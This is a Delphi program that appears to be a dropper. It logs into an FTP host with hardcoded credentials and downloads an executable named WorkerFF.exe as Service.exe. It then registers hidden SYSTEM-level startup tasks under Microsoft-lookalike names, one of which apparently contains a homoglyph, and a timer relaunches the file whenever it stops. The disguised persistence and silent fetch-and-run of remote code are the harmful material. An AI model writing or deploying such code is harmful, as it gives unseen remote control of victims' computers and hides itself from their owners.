program Project1;
uses
  SysUtils, ShellAPI, Windows, IdFTP, Tlhelp32, Classes;
  var
  FTP:TIdFtp;
  dir,s: string;
  i:integer;
  version:textfile;
  versionupdate:string;
  SL:TStringList;
  H: THandle;
  g:TStartupInfo;
  h1:TProcessInformation;

procedure ScheduleRunAtStartup(const ATaskName: string; const AFileName: string;
  const AUserAccount: string);
begin
  ShellExecute(0, nil, 'schtasks', PChar('/delete /f /tn "' + ATaskName + '"'),
    nil, SW_HIDE);
  ShellExecute(0, nil, 'schtasks', PChar('/create /tn "' + ATaskName + '" ' +
    '/tr "' + AFileName + '" /sc ONSTART /ru "' + AUserAccount + '"'),
    nil, SW_HIDE);
end;

function timeSetEvent(uDelay, uResolution: Longint; lpFunction: pointer; dwUser, uFlags: Longint): Longint;stdcall;external 'winmm.dll';

function ExecAndWait(const FileName,
                     Params: ShortString;
                     const WinState: Word): boolean; export;
var
  StartInfo: TStartupInfo;
  ProcInfo: TProcessInformation;
  CmdLine: ShortString;
  SecurityAttributes : PSecurityAttributes;
begin
  { Помещаем имя файла между кавычками, с соблюдением всех пробелов в именах Win9x }
  CmdLine := '"' + Filename + '" ' + Params;
  FillChar(StartInfo, SizeOf(StartInfo), #0);
  with StartInfo do
  begin
    cb := SizeOf(StartInfo);
    dwFlags := STARTF_USESHOWWINDOW;
    wShowWindow := WinState;
  end;

  Result := CreateProcess(nil, PChar( String( CmdLine ) ), nil, nil, false,
                          CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, nil,
                          PChar(ExtractFilePath(Filename)),StartInfo, ProcInfo);
  { Ожидаем завершения приложения }
  if Result then
  begin
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    { Free the Handles }
    CloseHandle(ProcInfo.hProcess);
    CloseHandle(ProcInfo.hThread);
  end;
end;

  function KillTask(ExeFileName: string): integer;
const
  PROCESS_TERMINATE=$0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  result := 0;

  FSnapshotHandle := CreateToolhelp32Snapshot
  (TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle,
  FProcessEntry32);

  while integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
    UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
    UpperCase(ExeFileName))) then
      Result := Integer(TerminateProcess(OpenProcess(
      PROCESS_TERMINATE, BOOL(0), FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;

  CloseHandle(FSnapshotHandle);
end;

function FindTask(ExeFileName: string): integer;
 var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
 begin
  result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while integer(ContinueLoop) <> 0 do
   begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) = UpperCase(ExeFileName))
     or (UpperCase(FProcessEntry32.szExeFile) = UpperCase(ExeFileName)))
      then Result := 1;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
   end;
  CloseHandle(FSnapshotHandle);
 end;

 procedure On_Timer(uTimerID, uMsg, dwUser, dw1, dw2: LongInt);stdcall;
begin
  if findtask('Service.exe')>0 then
  write('yes')
  else
  //ShellExecute(0,'open', 'Service.exe', nil, nil, SW_Hide);
  ExecAndWait(ExtractFilePath(ParamStr(0)) + 'Service.exe', '', SW_SHOWNORMAL);

end;

begin

H := CreateMutex(nil, True, '11111');
if GetLastError = ERROR_ALREADY_EXISTS then
Exit;
s:='1';
  versionupdate:='1.5';
   SL:=TStringList.Create();

       if not FileExists(ExtractFilePath(ParamStr(0))+'\version.txt') then
      begin

        SL.Add(s);
        SL.SaveToFile(ExtractFilePath(ParamStr(0))+'\version.txt');
      end;
   SL.LoadFromFile(ExtractFilePath(ParamStr(0))+'\version.txt');
  s:=SL.Strings[0];
  SL.Free;
  writeln(s);
  if s=versionupdate then
  else
  begin
  AssignFile(version, ExtractFilePath(ParamStr(0))+'\version.txt');
  if not FileExists(ExtractFilePath( ParamStr(0) )) then
 begin
  Rewrite(version);
  CloseFile(version);
 end;
  ReWrite(version);
  writeln(version,'1.5');
  CloseFile(version);
  killtask('service.exe');
  DeleteFile('Service.exe');
  dir := ExtractFilePath(ParamStr(0));
  FTP := TIdFTP.Create(nil);
   try
  FTP.Username:= 'ff';
  FTP.Password:= 'WorkerFF';
  FTP.Port:= 21;
  FTP.Host:= 'fokes1.asuscomm.com';
  FTP.Passive:= True;
  FTP.Connect;
  if FTP.Connected then
    try
      FTP.Get('WorkerFF.exe', ExtractFilePath(ParamStr(0))+'\Service.exe', True);
    except
      on E : Exception do
    end;

   finally
   ScheduleRunAtStartup('MicrosoftUpdaterr', ExtractFilePath(ParamStr(0))+'Service.exe', 'System');
   ScheduleRunAtStartup('MicrosoftUpdaterе', ExtractFilePath(ParamStr(0))+'Updater.exe', 'System');
     FTP.Quit;
     FTP.Free;
   end;
  end;
  timeSetEvent(2500, 2500, @On_Timer, 0, 1);
  readln;
end.
